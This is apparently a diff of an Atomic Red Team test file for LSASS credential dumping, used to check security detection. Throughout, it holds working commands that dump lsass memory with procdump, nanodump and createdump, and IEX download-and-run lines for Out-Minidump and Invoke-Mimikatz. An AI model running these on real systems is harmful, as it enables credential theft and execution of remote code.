@@ -15,12 +15,12 @@ atomic_tests:
   input_arguments:
     output_file:
       description: Path where resulting dump should be placed
-      type: Path
+      type: path
       default: C:\Windows\Temp\lsass_dump.dmp
     procdump_exe:
       description: Path of Procdump executable
-      type: Path
-      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -29,10 +29,11 @@ atomic_tests:
       if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
-      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
+      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip PathToAtomicsFolder\..\ExternalPayloads\Procdump -Force
       New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
-      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+      Copy-Item PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe #{procdump_exe} -Force
   executor:
     command: |
       #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
@@ -69,8 +70,8 @@ atomic_tests:
   input_arguments:
     dumpert_exe:
       description: Path of Dumpert executable
-      type: Path
-      default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -88,12 +89,12 @@ atomic_tests:
       del C:\windows\temp\dumpert.dmp >nul 2> nul
     name: command_prompt
     elevation_required: true
-    
+
 - name: Dump LSASS.exe Memory using NanoDump
   auto_generated_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
   description: |
     The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.
-    
+
     https://github.com/helpsystems/nanodump
 
     Upon successful execution, you should find the nanondump.dmp file in the temp directory
@@ -102,12 +103,13 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      NanoDump executable must exist on disk at specified location ($env:TEMP\nanodump.x64.exe)
+      NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
     prereq_command: |
-      if (Test-Path $env:TEMP\nanodump.x64.exe) {exit 0} else {exit 1}
+      if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "$env:TEMP\nanodump.x64.exe"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
   executor:
     command: |
       %temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"
@@ -146,12 +148,12 @@ atomic_tests:
   input_arguments:
     input_file:
       description: Path of the Lsass dump
-      type: Path
+      type: path
       default: '%tmp%\lsass.DMP'
     mimikatz_exe:
       description: Path of the Mimikatz binary
-      type: String
-      default: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -183,7 +185,7 @@ atomic_tests:
 
     Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.
 
-    Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
+    Successful execution of this test will display multiple usernames and passwords/hashes to the screen.
   supported_platforms:
   - windows
   dependency_executor_name: command_prompt
@@ -219,13 +221,16 @@ atomic_tests:
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
     powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
-    Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+    Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
+    
+    Author of Out-Minidump: Matthew Graeber (@mattifestation)
   supported_platforms:
   - windows
   executor:
     command: |
-       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      IEX (New-Object Net.WebClient).DownloadString('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'); get-process lsass | Out-Minidump
     cleanup_command: |
       Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
     name: powershell
@@ -244,12 +249,12 @@ atomic_tests:
   input_arguments:
     output_file:
       description: Path where resulting dump should be placed
-      type: Path
+      type: path
       default: C:\Windows\Temp\lsass_dump.dmp
     procdump_exe:
       description: Path of Procdump executable
-      type: Path
-      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -257,10 +262,11 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
-      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
+      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip PathToAtomicsFolder\..\ExternalPayloads\Procdump -Force
       New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
-      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+      Copy-Item PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe #{procdump_exe} -Force
   executor:
     command: |
       #{procdump_exe} -accepteula -mm lsass.exe #{output_file}
@@ -274,54 +280,44 @@ atomic_tests:
     Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
     If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
     Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
-    Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
+    Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
   supported_platforms:
   - windows
   input_arguments:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
     name: powershell
     elevation_required: true
-- name: Dump LSASS with .Net 5 createdump.exe
+- name: Dump LSASS with createdump.exe from .Net v5
   auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
   description: |
-    This test uses the technique describe in this tweet 
-    (https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass
+    Use createdump executable from .NET to create an LSASS dump.
+
+    [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)
   supported_platforms:
   - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: C:\Windows\Temp\dotnet-lsass.dmp
-    createdump_exe:
-      description: Path of createdump.exe executable
-      type: Path
-      default: 'C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe'
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Computer must have createdump.exe from .Net 5
+      .Net v5 must be installed
     prereq_command: |
-      if (Test-Path '#{createdump_exe}') {exit 0} else {exit 1}
+      $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
+      if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}
     get_prereq_command: |
-      echo ".NET 5 must be installed manually." "For the very brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
+      winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
   executor:
     command: |
-      echo "Createdump Path #{createdump_exe}"
-      $LSASS = tasklist | findstr "lsass"
-      $FIELDS = $LSASS -split "\s+"
-      $ID = $FIELDS[1]
-      & "#{createdump_exe}" -u -f #{output_file} $ID
+      $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
+      & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
     cleanup_command: |
-      Remove-Item #{output_file} -ErrorAction Ignore
+      Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
     name: powershell
-    elevation_required: true  
+    elevation_required: true
 - name: Dump LSASS.exe using imported Microsoft DLLs
   auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
   description: |
@@ -335,11 +331,11 @@ atomic_tests:
   input_arguments:
     xordump_exe:
       description: Path to xordump
-      type: Path
+      type: path
       default: C:\Windows\Temp\xordump.exe
     output_file:
       description: Path where resulting dump should be placed
-      type: Path
+      type: path
       default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
   dependencies:
   - description: |
